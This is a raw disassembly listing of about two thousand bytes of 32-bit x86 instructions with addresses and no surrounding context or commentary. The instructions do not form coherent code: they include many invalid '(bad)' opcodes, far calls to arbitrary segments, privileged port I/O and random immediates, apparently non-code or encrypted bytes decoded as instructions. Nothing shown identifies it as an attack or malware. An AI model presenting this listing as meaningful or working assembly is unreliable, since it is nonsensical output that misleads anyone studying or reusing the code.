  413cd6:	sbb    edx,DWORD PTR [edx-0x76]
  413cd9:	mov    ecx,0x4e78fc29
  413cde:	xchg   ecx,eax
  413cdf:	mov    ds:0xb7875bce,al
  413ce4:	xchg   ebp,eax
  413ce5:	mov    al,0xd2
  413ce7:	xchg   ebp,eax
  413ce8:	fisub  WORD PTR [ebp+0x1f]
  413ceb:	stos   DWORD PTR es:[edi],eax
  413cec:	fiadd  DWORD PTR [ecx-0x5b5e89f1]
  413cf2:	adc    eax,0xa795a616
  413cf7:	add    BYTE PTR [ecx-0x7],0xa5
  413cfb:	fs lock jbe 0x413d09
  413cff:	lock pop es
  413d01:	adc    ebp,eax
  413d03:	fstp   QWORD PTR [esi-0x1395c210]
  413d09:	stos   DWORD PTR es:[edi],eax
  413d0a:	lea    ebp,[edx-0x5a9fe0bc]
  413d10:	(bad)  
  413d11:	mov    es,WORD PTR [ecx]
  413d13:	mov    edx,es
  413d15:	shl    BYTE PTR [ebx-0x4bde3076],0x5f
  413d1c:	fisubr DWORD PTR [edx+0x65a925a]
  413d22:	jns    0x413da1
  413d24:	cmp    ecx,edi
  413d26:	out    0x78,eax
  413d28:	mov    eax,DWORD PTR [ecx-0xc]
  413d2b:	dec    esi
  413d2c:	or     edi,DWORD PTR [ecx-0x20e57f84]
  413d32:	(bad)  
  413d33:	aaa    
  413d34:	xchg   edi,eax
  413d35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d36:	mov    bl,0xc2
  413d38:	sbb    eax,0xfb147081
  413d3d:	mov    ds:0xf0336ea3,al
  413d42:	mov    ch,0xba
  413d44:	and    DWORD PTR [ecx+0x76],edx
  413d47:	fnsave [eax+0xb5f173]
  413d4d:	and    DWORD PTR [ebp-0x56c2d43d],edx
  413d53:	mov    edi,0xb4258685
  413d58:	push   cs
  413d59:	in     al,0xb
  413d5b:	push   0x9e566ffc
  413d60:	gs aas 
  413d62:	push   eax
  413d63:	call   0xad2b:0xeb489ec6
  413d6a:	xchg   DWORD PTR [esi+0x34658955],ebx
  413d70:	lahf   
  413d71:	pop    ds
  413d72:	mov    ecx,es
  413d74:	cmp    BYTE PTR [eax+0x3548975d],dl
  413d7a:	lea    ecx,[edi-0x71]
  413d7d:	or     edi,DWORD PTR [ebp+0x7e000d05]
  413d83:	push   cs
  413d84:	imul   edx,ecx,0xffffffdf
  413d87:	dec    edi
  413d88:	mov    ah,0xf6
  413d8a:	mov    esp,0x5327694c
  413d8f:	add    esi,DWORD PTR [ecx-0x28f132d1]
  413d95:	dec    ebp
  413d96:	pop    ecx
  413d97:	in     eax,dx
  413d98:	call   0x93173ab9
  413d9d:	inc    DWORD PTR [eax]
  413d9f:	je     0x413d5f
  413da1:	rol    DWORD PTR ds:0xb508d703,0xd1
  413da8:	jns    0x413de0
  413daa:	and    eax,DWORD PTR [esi-0xf]
  413dad:	jp     0x413d5b
  413daf:	ds add eax,0xaeea54e7
  413db5:	sbb    BYTE PTR [ecx+0x11b6d57e],bl
  413dbb:	fsubr  QWORD PTR [edx]
  413dbd:	pop    ss
  413dbe:	call   0xe16f:0xdc426b0f
  413dc5:	and    edi,0x6a
  413dc8:	add    eax,0x97efee7a
  413dcd:	and    al,0x49
  413dcf:	out    0x1c,al
  413dd1:	push   cs
  413dd2:	popa   
  413dd3:	call   0xd44d973f
  413dd8:	mov    ecx,0x10b29eef
  413ddd:	xor    ebp,ebp
  413ddf:	das    
  413de0:	xor    edx,0x4d
  413de3:	xor    eax,0xd00ba768
  413de8:	(bad)  
  413de9:	(bad)  [ecx]
  413deb:	out    dx,eax
  413dec:	repnz int 0x87
  413def:	mov    al,0x2f
  413df1:	je     0x413d9f
  413df3:	nop
  413df4:	js     0x413e00
  413df6:	(bad)  
  413df7:	cmp    eax,0xa2c401a9
  413dfc:	fcomp  QWORD PTR [edx+eiz*8-0x75293f09]
  413e03:	repz mov ds:0xb7805501,al
  413e09:	xlat   BYTE PTR ds:[ebx]
  413e0a:	cmp    eax,0x3ba898f8
  413e0f:	das    
  413e10:	jne    0x413d9b
  413e12:	sub    ecx,DWORD PTR [eax+esi*1]
  413e15:	test   eax,0x3f9b466e
  413e1a:	jge    0x413e70
  413e1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e1d:	imul   edi,DWORD PTR [ebx-0xb],0xffffffff
  413e21:	retf   0x8ca2
  413e24:	mov    ecx,0xe949fba9
  413e29:	ins    BYTE PTR es:[edi],dx
  413e2a:	inc    esi
  413e2b:	enter  0x2796,0xab
  413e2f:	lds    esi,FWORD PTR [esi+0x2427f531]
  413e35:	mov    esp,0x8d33d94e
  413e3a:	xor    al,0xc2
  413e3c:	mov    dh,0xa4
  413e3e:	dec    esi
  413e3f:	cmp    BYTE PTR [ecx+ebp*2],cl
  413e42:	push   eax
  413e43:	js     0x413e51
  413e45:	nop
  413e46:	gs push ecx
  413e48:	inc    ebp
  413e49:	cld    
  413e4a:	ins    BYTE PTR es:[edi],dx
  413e4b:	cmp    BYTE PTR [ecx],cl
  413e4d:	pop    edx
  413e4e:	and    esi,edi
  413e50:	std    
  413e51:	jno    0x413e4b
  413e53:	pop    ecx
  413e54:	mov    edx,0x1579786f
  413e59:	push   eax
  413e5a:	pop    DWORD PTR [esi-0x718d56d3]
  413e60:	pop    esp
  413e61:	ret    0x4eab
  413e64:	lods   al,BYTE PTR ds:[esi]
  413e65:	and    eax,0xd7a67e8
  413e6a:	sar    ebp,cl
  413e6c:	push   edi
  413e6d:	sub    al,0x75
  413e6f:	inc    esp
  413e70:	or     DWORD PTR [edi+edx*4],eax
  413e73:	mov    ch,ch
  413e75:	inc    ebp
  413e76:	test   eax,0x4d4f8d59
  413e7b:	adc    al,bl
  413e7d:	cmc    
  413e7e:	cmp    ebx,eax
  413e80:	jge    0x413e3c
  413e82:	test   DWORD PTR [edx-0x49],0x78fabd0b
  413e89:	enter  0x3ffc,0xd5
  413e8d:	push   ebx
  413e8e:	inc    ebp
  413e8f:	nop
  413e90:	mov    al,ds:0x862bf78
  413e95:	jbe    0x413eaa
  413e97:	punpcklbw mm0,DWORD PTR [ecx-0x29]
  413e9b:	inc    ebx
  413e9c:	inc    esp
  413e9d:	je     0x413e49
  413e9f:	sbb    eax,DWORD PTR [ebp+0x4c]
  413ea2:	pop    ecx
  413ea3:	sar    al,1
  413ea5:	popa   
  413ea6:	jecxz  0x413ecc
  413ea8:	pop    eax
  413ea9:	xor    edx,0x3edf7705
  413eaf:	sub    BYTE PTR [ecx+0x16],al
  413eb2:	ss sbb edi,eax
  413eb5:	sub    al,0x4a
  413eb7:	and    cl,dl
  413eb9:	mov    al,0x0
  413ebb:	inc    ebx
  413ebc:	cmp    eax,DWORD PTR [ecx-0x2816df4c]
  413ec2:	popf   
  413ec3:	dec    esp
  413ec4:	mov    dh,0x39
  413ec6:	(bad)  
  413ec7:	stc    
  413ec8:	mov    dh,0xc5
  413eca:	aad    0x55
  413ecc:	or     cl,BYTE PTR [edi+0x3f]
  413ecf:	(bad)  
  413ed0:	mov    edx,0x564b413a
  413ed5:	in     eax,0x74
  413ed7:	mov    esi,0xb6d4f18c
  413edc:	mov    edx,0xd52d1dd1
  413ee1:	call   0x6839:0x19028acf
  413ee8:	ins    BYTE PTR es:[edi],dx
  413ee9:	in     al,dx
  413eea:	repnz int3 
  413eec:	(bad)
  413ef0:	test   al,0xc4
  413ef2:	or     esi,DWORD PTR [ebp+0x1f6d4e33]
  413ef8:	es in  al,0x57
  413efb:	jmp    0x413f3e
  413efd:	or     dh,BYTE PTR [ebx+0x65691461]
  413f03:	mov    al,0xc0
  413f05:	sub    al,BYTE PTR [esi-0x48]
  413f08:	push   ds
  413f09:	jg     0x413f12
  413f0b:	pop    ebp
  413f0c:	retf   
  413f0d:	inc    edx
  413f0e:	push   ss
  413f0f:	test   BYTE PTR [esi],al
  413f11:	xchg   edx,eax
  413f12:	cld    
  413f13:	imul   ebp,DWORD PTR [edi-0x2a6bef58],0x4
  413f1a:	fstp   DWORD PTR [ecx-0x2c567b92]
  413f20:	cmp    bl,al
  413f22:	pop    ecx
  413f23:	(bad)  
  413f24:	jl     0x413f69
  413f26:	mov    esp,0x8ea1e973
  413f2b:	ret    
  413f2c:	or     al,0x5d
  413f2e:	jnp    0x413f96
  413f30:	mov    dl,0xe
  413f32:	(bad)  
  413f33:	dec    esi
  413f34:	nop
  413f35:	mov    edx,0x2cbc5f35
  413f3a:	jmp    0x413f73
  413f3c:	test   DWORD PTR [esi],ebp
  413f3e:	leave  
  413f3f:	in     al,dx
  413f40:	lahf   
  413f41:	stc    
  413f42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f43:	mov    esp,0x9b99da9e
  413f48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f49:	jb     0x413eea
  413f4b:	jle    0x413ee4
  413f4d:	lods   al,BYTE PTR ds:[esi]
  413f4e:	sahf   
  413f4f:	fucomp st(0)
  413f51:	and    ah,dl
  413f53:	hlt    
  413f54:	xchg   esp,eax
  413f55:	xchg   ecx,eax
  413f56:	xor    eax,0x734dab76
  413f5b:	test   DWORD PTR [ebx-0xe],0x1e0b96f9
  413f62:	rol    ah,cl
  413f64:	fisttp WORD PTR [ecx-0x3a4ed50d]
  413f6a:	jl     0x413f00
  413f6c:	sar    BYTE PTR [edi+ebx*4+0x3b1838eb],cl
  413f73:	mov    WORD PTR [edi],gs
  413f75:	xchg   ebp,eax
  413f76:	xchg   edx,eax
  413f77:	push   0xed7e7e24
  413f7c:	test   BYTE PTR [ebx-0x241adc66],ch
  413f82:	xor    DWORD PTR [eax+0x33adfcb8],0xaf0ac17a
  413f8c:	fs push esp
  413f8e:	fcom   QWORD PTR [ecx]
  413f90:	mov    ebp,0x522718dc
  413f95:	add    esi,DWORD PTR [ecx]
  413f97:	outs   dx,BYTE PTR ds:[esi]
  413f98:	lds    eax,FWORD PTR [ebp-0x6d1361c1]
  413f9e:	pop    ebx
  413f9f:	sub    DWORD PTR [ebx],edi
  413fa1:	jg     0x413fd1
  413fa3:	jb     0x41400a
  413fa5:	out    0x8d,al
  413fa7:	add    al,0xca
  413fa9:	in     al,dx
  413faa:	lds    edi,FWORD PTR es:[edx+0x5f95326d]
  413fb1:	out    dx,al
  413fb2:	retf   0xd66d
  413fb5:	dec    ebp
  413fb6:	adc    ch,0x69
  413fb9:	dec    ebp
  413fba:	add    dl,dh
  413fbc:	lahf   
  413fbd:	push   ecx
  413fbe:	in     al,0x21
  413fc0:	mov    al,ds:0x13cbb37c
  413fc5:	mov    al,ds:0x291cb9de
  413fca:	ja     0x41400a
  413fcc:	xchg   edi,eax
  413fcd:	pop    eax
  413fce:	dec    edi
  413fcf:	xor    ebx,esp
  413fd1:	mov    eax,0x72186685
  413fd6:	es out dx,al
  413fd8:	push   ds
  413fd9:	lods   al,BYTE PTR ds:[esi]
  413fda:	daa    
  413fdb:	data16 or al,0xcc
  413fde:	pop    ss
  413fdf:	jecxz  0x413fad
  413fe1:	fsub   DWORD PTR [edi+edi*2+0x7b]
  413fe5:	in     eax,dx
  413fe6:	sub    bh,BYTE PTR [ebx-0x761c977b]
  413fec:	aas    
  413fed:	push   cs
  413fee:	xchg   BYTE PTR [edi],al
  413ff0:	mul    BYTE PTR [ecx-0x75]
  413ff3:	out    0xed,eax
  413ff5:	push   es
  413ff6:	icebp  
  413ff7:	jo     0x414037
  413ff9:	arpl   WORD PTR [ebp-0x6b],bp
  413ffc:	mov    cl,0x6d
  413ffe:	push   ss
  413fff:	in     eax,dx
  414000:	inc    edi
  414001:	mov    edi,0xf8816b0b
  414006:	inc    ecx
  414007:	dec    esp
  414008:	aam    0xe2
  41400a:	xchg   ecx,eax
  41400b:	aas    
  41400c:	imul   esi,DWORD PTR [edi+0x3fafb369],0x69
  414013:	jecxz  0x413fa3
  414015:	dec    eax
  414016:	push   cs
  414017:	mov    ds:0x413de54a,eax
  41401c:	or     eax,0xff9622bb
  414021:	stos   BYTE PTR es:[edi],al
  414022:	imul   eax,DWORD PTR [edx+0x266e1e96],0x58
  414029:	cli    
  41402a:	stc    
  41402b:	and    edi,DWORD PTR [esi-0x32]
  41402e:	jecxz  0x413ff8
  414030:	xor    al,0x9e
  414032:	push   edi
  414033:	pushw  0x1a93
  414037:	test   eax,0xdbb0dc35
  41403c:	jns    0x4140b4
  41403e:	pop    eax
  41403f:	(bad)  
  414040:	rcl    BYTE PTR [edx],1
  414042:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414043:	jne    0x413fd0
  414045:	xor    al,0x73
  414047:	xchg   ebx,eax
  414048:	xchg   ebp,eax
  414049:	iret   
  41404a:	or     ebp,ebx
  41404c:	nop
  41404d:	fbstp  TBYTE PTR [eax+0x3ab016bd]
  414053:	fist   DWORD PTR [ebp-0x20a6d791]
  414059:	call   0x4210:0x31d003d1
  414060:	fsubrp st(3),st
  414062:	push   edi
  414063:	cmp    al,0xeb
  414065:	enter  0x750d,0x68
  414069:	dec    esp
  41406a:	sar    BYTE PTR [edx+0x19a578f2],0x48
  414071:	fistp  WORD PTR [esi+0x175d0ea1]
  414077:	push   0x8d5b8c28
  41407c:	fiadd  DWORD PTR ds:0x50051e7d
  414082:	lods   eax,DWORD PTR ds:[esi]
  414083:	adc    esp,DWORD PTR [ebx+ebp*2+0x67bb9ba4]
  41408a:	sahf   
  41408b:	lods   al,BYTE PTR ds:[esi]
  41408c:	cmp    eax,0x9dcc5684
  414091:	(bad)  
  414092:	out    0x1a,al
  414094:	inc    ebp
  414095:	jl     0x414069
  414097:	add    BYTE PTR [edi-0x31],bh
  41409a:	xchg   edx,eax
  41409b:	mov    ebx,ebp
  41409d:	(bad)  
  41409e:	sbb    edi,DWORD PTR [edx]
  4140a0:	dec    ecx
  4140a1:	es xchg edi,eax
  4140a3:	mov    dl,0x25
  4140a5:	imul   eax,DWORD PTR [edi-0x1c5a9f41],0x1989062c
  4140af:	and    ebp,DWORD PTR [esi]
  4140b1:	pop    ecx
  4140b2:	imul   esp,esi,0xffffffca
  4140b5:	cmp    DWORD PTR [ecx-0x31],edi
  4140b8:	or     DWORD PTR [ebx],ebx
  4140ba:	jne    0x41406f
  4140bc:	into   
  4140bd:	push   ecx
  4140be:	jnp    0x4140a6
  4140c0:	setge  BYTE PTR [eax-0x1c46da53]
  4140c7:	aaa    
  4140c8:	push   0xab68f8e8
  4140cd:	cwde   
  4140ce:	out    dx,eax
  4140cf:	std    
  4140d0:	dec    edi
  4140d1:	inc    esp
  4140d2:	push   edx
  4140d4:	dec    edx
  4140d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4140d6:	jge    0x41414a
  4140d8:	inc    edx
  4140d9:	ins    BYTE PTR es:[edi],dx
  4140da:	inc    ebx
  4140db:	repnz and eax,0xfd988908
  4140e1:	and    bh,cl
  4140e3:	jg     0x4140ff
  4140e5:	mov    dh,0xb1
  4140e7:	rol    DWORD PTR [ebx+0x4d],1
  4140ea:	je     0x4140e4
  4140ec:	into   
  4140ed:	daa    
  4140ee:	je     0x414119
  4140f0:	and    al,0x3e
  4140f2:	ja     0x4140e3
  4140f4:	jge    0x414124
  4140f6:	adc    ch,BYTE PTR [ebp+0x77e8b587]
  4140fc:	das    
  4140fd:	sub    BYTE PTR [ebx+0x27],0x98
  414101:	mov    esp,0x33cb3b0a
  414106:	sbb    eax,0x9ddd571b
  41410b:	int3   
  41410c:	test   BYTE PTR [edi-0x40],dl
  41410f:	cmp    eax,0x950575ee
  414114:	jbe    0x4140cb
  414116:	pop    ecx
  414117:	cmp    al,bh
  414119:	pop    esi
  41411a:	dec    ecx
  41411b:	and    bl,dl
  41411d:	mov    eax,0xe4d91dcc
  414122:	stos   DWORD PTR es:[edi],eax
  414123:	lds    edi,FWORD PTR [esi]
  414125:	or     BYTE PTR [ecx],ch
  414127:	inc    ecx
  414128:	sbb    eax,0x7eb939da
  41412d:	jo     0x414160
  41412f:	xchg   esi,eax
  414130:	sub    ah,BYTE PTR [edi+eiz*4+0x20cb6043]
  414137:	jg     0x414192
  414139:	jge    0x4140ec
  41413b:	rcr    DWORD PTR [eax+edi*2+0x1a],cl
  41413f:	dec    ebp
  414140:	iret   
  414141:	loop   0x414154
  414143:	clc    
  414144:	dec    DWORD PTR [ebx+0x1d]
  414147:	adc    dh,BYTE PTR [eax-0x702fda17]
  41414d:	imul   ecx,DWORD PTR ds:0x8ead9699,0x56
  414154:	ja     0x414118
  414156:	adc    cl,BYTE PTR [esi-0x75]
  414159:	jp     0x414183
  41415b:	mov    BYTE PTR [edx+0x5248abd8],ah
  414161:	xor    BYTE PTR [edx+0x72afa81],0xb1
  414168:	adc    edx,DWORD PTR [edi+ecx*2+0x28]
  41416c:	jo     0x414149
  41416e:	arpl   WORD PTR [edi+0x54],cx
  414171:	icebp  
  414172:	cmp    esi,DWORD PTR [eax]
  414174:	mul    BYTE PTR [esi+0x29]
  414177:	or     DWORD PTR [ecx+0x63ccf277],esi
  41417d:	pop    edi
  41417e:	pusha  
  41417f:	out    dx,al
  414180:	fistp  QWORD PTR [ebx]
  414182:	ss mov ah,0xb7
  414185:	pop    edx
  414186:	jbe    0x414116
  414188:	jmp    FWORD PTR [ebx+0x33f05e77]
  41418e:	fisub  DWORD PTR [edi]
  414190:	test   al,0x71
  414192:	push   ds
  414193:	mov    ch,0xd4
  414195:	or     cl,BYTE PTR [ecx+0x7806838b]
  41419b:	mov    eax,ds:0x197462aa
  4141a0:	lods   al,BYTE PTR ds:[esi]
  4141a1:	sbb    al,ch
  4141a3:	sub    BYTE PTR [esi],al
  4141a5:	hlt    
  4141a6:	ss push eax
  4141a8:	aad    0x22
  4141aa:	mov    ds:0xd1379c8b,eax
  4141af:	jl     0x4141a9
  4141b1:	xor    BYTE PTR [edx-0x7c8c8b3f],ch
  4141b7:	add    eax,0xe4d4baea
  4141bc:	rcl    BYTE PTR [edx-0x68],1
  4141bf:	jp     0x4141ab
  4141c1:	xchg   ecx,eax
  4141c2:	and    ebp,DWORD PTR [esp+ebx*8-0xb9af8d6]
  4141c9:	xchg   edx,eax
  4141ca:	mov    eax,0x29d652ec
  4141cf:	cmp    eax,0x6baff644
  4141d4:	sub    dh,cl
  4141d6:	imul   ebp,DWORD PTR [ebp+eax*4-0x6eeb394f],0x30485e0f
  4141e1:	popa   
  4141e2:	and    ch,BYTE PTR [ebx]
  4141e4:	sbb    eax,0x59f78742
  4141e9:	sahf   
  4141ea:	das    
  4141eb:	mov    eax,ds:0xf2169739
  4141f0:	push   ss
  4141f1:	icebp  
  4141f2:	xchg   esi,eax
  4141f3:	cmp    al,0x96
  4141f5:	dec    ebx
  4141f6:	xchg   edi,eax
  4141f7:	jmp    0x4141c8
  4141f9:	sbb    BYTE PTR [esi],0xbb
  4141fc:	fsub   st,st(2)
  4141fe:	mov    BYTE PTR [eax+edx*2+0x59119eb4],ch
  414205:	add    bl,bh
  414207:	xlat   BYTE PTR ds:[ebx]
  414208:	push   ss
  414209:	out    dx,eax
  41420a:	aaa    
  41420b:	ins    BYTE PTR es:[edi],dx
  41420c:	jns    0x4141fe
  41420e:	push   edx
  41420f:	xlat   BYTE PTR ds:[ebx]
  414210:	dec    esp
  414211:	repnz sbb dl,BYTE PTR [edx+ecx*1-0x6705881]
  414219:	popf   
  41421a:	pop    esi
  41421b:	inc    edx
  41421c:	mov    BYTE PTR [ecx],dh
  41421e:	or     al,0xf
  414220:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414221:	xor    BYTE PTR [ebx-0x68bbd4d4],al
  414227:	pop    esi
  414228:	push   ebp
  414229:	pop    esp
  41422a:	add    dh,BYTE PTR [edx-0x31]
  41422d:	pop    ebx
  41422e:	mov    dh,0x46
  414230:	mov    ch,0x46
  414232:	jecxz  0x41424a
  414234:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414235:	cmp    eax,0x78c66ad1
  41423a:	pop    ss
  41423b:	push   ebp
  41423c:	adc    cl,BYTE PTR [edi+eax*2+0x17]
  414240:	push   ss
  414241:	cwde   
  414242:	loop   0x41422a
  414244:	std    
  414245:	add    eax,DWORD PTR [ecx]
  414247:	xchg   ebx,eax
  414248:	retf   0x6efa
  41424b:	add    ah,BYTE PTR [edi]
  41424d:	sub    BYTE PTR [ecx-0x3c6c2152],0x9e
  414254:	imul   ebp,DWORD PTR [eax+ebx*2-0x65],0x6b
  414259:	inc    DWORD PTR [ebp+0x7c6eb7ce]
  41425f:	inc    eax
  414260:	test   eax,0xeede6d37
  414265:	cmp    dl,BYTE PTR [ebx+0x56]
  414268:	push   cs
  414269:	fisub  WORD PTR [edx]
  41426b:	mov    bh,0x1c
  41426d:	es mov dh,0xc7
  414270:	push   ebp
  414271:	cld    
  414272:	add    esi,ebp
  414274:	pop    es
  414275:	call   0x7225:0xd1dfb613
  41427c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41427d:	mov    ds:0xcf8c9332,al
  414282:	pusha  
  414283:	and    al,0x4b
  414285:	ins    DWORD PTR es:[edi],dx
  414286:	jg     0x414209
  414288:	xchg   ebx,eax
  414289:	jo     0x414297
  41428b:	ja     0x414275
  41428d:	stos   DWORD PTR es:[edi],eax
  41428e:	and    ebp,edx
  414290:	lods   al,BYTE PTR ds:[esi]
  414291:	push   esp
  414292:	mov    ds:0x91304ba0,eax
  414297:	inc    esi
  414298:	cmp    eax,0xe1a0d6c0
  41429d:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41429f:	dec    ebx
  4142a0:	jmp    0xc4bd:0x49766386
  4142a7:	dec    edx
  4142a8:	sbb    edx,DWORD PTR [eax]
  4142aa:	jne    0x41430e
  4142ac:	push   ds
  4142ad:	mov    esi,0xf112dda2
  4142b2:	sub    BYTE PTR [ebx],bh
  4142b4:	jmp    0x41427a
  4142b6:	lock clc 
  4142b8:	and    al,0x70
  4142ba:	loop   0x414328
  4142bc:	fdiv   st,st(2)
  4142be:	mov    dh,al
  4142c0:	mov    es,WORD PTR [esi]
  4142c2:	jle    0x414261
  4142c4:	mov    eax,0x5601bc8d
  4142c9:	test   al,0x8
  4142cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142cc:	mov    cl,0x32
  4142ce:	repnz into 
  4142d0:	outs   dx,BYTE PTR ds:[esi]
  4142d1:	pushf  
  4142d2:	mov    WORD PTR [ebx-0x35],ss
  4142d5:	in     eax,dx
  4142d6:	mov    esi,ds
  4142d8:	sbb    dh,0x32
  4142db:	sub    eax,0x43619f8a
  4142e0:	jno    0x4142b7
  4142e2:	scas   eax,DWORD PTR es:[edi]
  4142e3:	outs   dx,DWORD PTR ds:[esi]
  4142e4:	mov    eax,ds:0x85458502
  4142e9:	test   eax,0xd8c6fe28
  4142ee:	xor    al,0x7a
  4142f0:	popa   
  4142f1:	xor    eax,0x926d00b8
  4142f6:	addr16 cli 
  4142f8:	out    0xd8,eax
  4142fa:	pop    eax
  4142fb:	pop    eax
  4142fc:	cmp    eax,0xddad5c10
  414301:	lahf   
  414302:	adc    ecx,DWORD PTR [esi]
  414304:	fwait
  414305:	sbb    eax,0xbd4ae0d4
  41430a:	inc    ebp
  41430b:	xor    eax,0xb1bdcf57
  414310:	pop    ss
  414311:	sbb    DWORD PTR [esp+eax*2-0x1eaafd7b],0x7
  414319:	dec    esp
  41431a:	cld    
  41431b:	call   0xdb16:0xe9c944c
  414322:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414323:	add    DWORD PTR [ebx+eiz*8-0x5c4078d7],0x72
  41432b:	mul    BYTE PTR [ebx+0x1f4e4b00]
  414331:	test   ch,0x9d
  414334:	and    bl,dl
  414336:	nop
  414337:	loop   0x41435f
  414339:	pop    ds
  41433a:	sbb    eax,0xaf57487
  41433f:	int3   
  414340:	out    0xb0,eax
  414342:	or     eax,0xc19ed524
  414347:	je     0xfef9dcdc
  41434d:	retf   0x8110
  414350:	les    ebx,FWORD PTR [ecx-0x22]
  414353:	xchg   DWORD PTR [edi+0x26],esp
  414356:	stos   DWORD PTR es:[edi],eax
  414357:	mov    esi,0x91c4839b
  41435c:	test   DWORD PTR [ebx+0x3dc3bfd5],ebx
  414362:	imul   ebp,DWORD PTR [ebx],0x3bac2afc
  414368:	mov    ss,WORD PTR [edx+0x35]
  41436b:	or     esp,DWORD PTR [ebx+0x1ea0351b]
  414371:	call   0x5b75a27d
  414376:	add    BYTE PTR [ebp+eiz*8+0x14],bh
  41437a:	mov    edi,0x6e790295
  41437f:	mov    al,ds:0x1bb66b78
  414384:	inc    edx
  414385:	sahf   
  414386:	inc    edi
  414387:	push   es
  414388:	jmp    0x4569:0x5d8812d9
  41438f:	inc    esi
  414390:	(bad)  
  414391:	cdq    
  414392:	fisttp DWORD PTR [eax+ebx*1]
  414395:	sbb    BYTE PTR [edi+ebx*8+0x417ced4b],0xd1
  41439d:	retf   
  41439e:	push   ebx
  41439f:	add    bl,BYTE PTR [eax-0x2a]
  4143a2:	mov    eax,ds:0x97534d50
  4143a7:	mov    ecx,0xb29a81a2
  4143ac:	call   0x688a:0xd3f247ed
  4143b3:	xlat   BYTE PTR ds:[ebx]
  4143b4:	mov    bh,0x12
  4143b6:	jb     0x4143fa
  4143b8:	cmp    al,0x11
  4143ba:	iret   
  4143bb:	xchg   ecx,eax
  4143bc:	push   es
  4143bd:	mov    ebp,0x1cf05079
  4143c2:	adc    ecx,ecx
  4143c4:	cli    
  4143c5:	inc    esi
  4143c6:	int    0x18
  4143c8:	jge    0x414394
  4143ca:	mov    ch,BYTE PTR [ebp+ebx*8-0x3c]
  4143ce:	lea    eax,cs:[edi-0x6b]
  4143d2:	test   DWORD PTR [ebx-0x45a6afed],0x6346bf20
  4143dc:	sbb    BYTE PTR [ebx+0x6487ea39],ch
  4143e2:	pop    edi
  4143e3:	je     0x414428
  4143e5:	jae    0x41442c
  4143e7:	aad    0x1c
  4143e9:	mov    ds:0xa88fd8e9,al
  4143ee:	pop    ss
  4143ef:	jae    0x4143c0
  4143f1:	or     BYTE PTR [edx+0x62dda3b0],ah
  4143f7:	out    0x99,al
  4143f9:	cmp    dl,BYTE PTR [esi+0x65]
  4143fc:	xchg   ecx,eax
  4143fd:	std    
  4143fe:	in     al,0x3a
  414400:	test   DWORD PTR [eax],edx
  414402:	hlt    
  414403:	int    0xc
  414405:	lods   al,BYTE PTR ds:[esi]
  414406:	pop    ds
  414407:	and    al,0xc
  414409:	(bad)  
  41440a:	mov    eax,ds:0xc83c59c4
  41440f:	mov    ecx,0x32bd6d49
  414414:	pop    ss
  414415:	daa    
  414416:	das    
  414417:	push   cs
  414418:	fdivr  QWORD PTR [ecx+eax*8]
  41441b:	add    ebp,esp
  41441d:	inc    ebx
  41441e:	push   ds
  41441f:	sbb    ebp,edx
  414421:	leave  
  414422:	push   ecx
  414423:	xor    dl,bh
  414425:	test   al,0xd0
  414427:	xor    DWORD PTR [esi-0x51],ecx
  41442a:	inc    edi
  41442b:	xor    eax,0xa6942207
  414430:	test   al,0xc6
  414432:	or     al,0xcf
  414434:	pcmpeqw mm4,QWORD PTR [ebx+0x64e332c4]
  41443b:	xor    dl,BYTE PTR [ebp+0x0]
  41443e:	adc    DWORD PTR [edx],edx
  414440:	(bad)  
  414441:	mov    ss,edi
  414443:	dec    esp
  414444:	mov    edx,0x1c02a765
  414449:	inc    ecx
  41444a:	xchg   edi,eax
  41444b:	cmp    DWORD PTR ds:0xb960d071,0xf76acd3b
  414455:	push   0xffffff8e
  414457:	repnz pushf 
  414459:	adc    eax,0x6ae8531f
  41445e:	lahf   
  41445f:	mov    eax,0x77518641
  414464:	push   0xffffffbc
  414466:	xor    eax,0xe2ee429e
  41446b:	cli    
  41446c:	jb     0x4144c6
  41446e:	jmp    0x663c8151
  414473:	in     eax,0x58
  414475:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414476:	sbb    dl,dh
  414478:	sbb    ch,bh
  41447a:	ror    BYTE PTR [ebx],1
  41447c:	ret    
  41447d:	sub    DWORD PTR [ebp+0x7e186321],esi
  414483:	outs   dx,DWORD PTR ds:[esi]
  414484:	mov    edi,0xc749f4a2
  414489:	inc    eax
  41448a:	sahf   
  41448b:	xchg   ah,bl
  41448d:	rol    DWORD PTR [edx],cl
  41448f:	inc    esi
  414490:	sub    al,al
  414492:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414493:	sub    BYTE PTR ds:0x84657913,0xc8
  41449a:	mov    dl,0xd
  41449c:	cs mov esp,0x759b5444
  4144a2:	pop    eax
  4144a3:	inc    ecx
  4144a4:	sbb    bh,BYTE PTR [ebx-0x78]
  4144a7:	addr16 leave 
  4144a9:	xor    DWORD PTR [edx-0x59],0xffffffe2
  4144ad:	push   cs
  4144ae:	adc    BYTE PTR [ecx-0x7b],bh
  4144b1:	sbb    edx,DWORD PTR [eax+0x743c5bac]
  4144b7:	clc    
  4144b8:	ins    DWORD PTR es:[edi],dx
  4144b9:	ins    DWORD PTR es:[edi],dx
  4144ba:	dec    eax
  4144bb:	inc    ebx
  4144bc:	ins    DWORD PTR es:[edi],dx
  4144bd:	scas   al,BYTE PTR es:[edi]
  4144be:	jle    0x414496
  4144c0:	repnz scas eax,DWORD PTR es:[edi]
  4144c2:	psubusw mm0,mm6
  4144c5:	imul   ebx,DWORD PTR [ebx-0x6f],0x171a5aea
  4144cc:	xchg   edi,eax
  4144cd:	adc    DWORD PTR [edi],edx
  4144cf:	(bad)  
  4144d0:	daa    
  4144d1:	add    al,0x8c
  4144d3:	add    DWORD PTR [esp+esi*1-0x7d],ebp
  4144d7:	inc    esi
  4144d8:	pop    ebx
  4144d9:	push   eax
  4144da:	or     ch,BYTE PTR [edx-0x6ba26579]
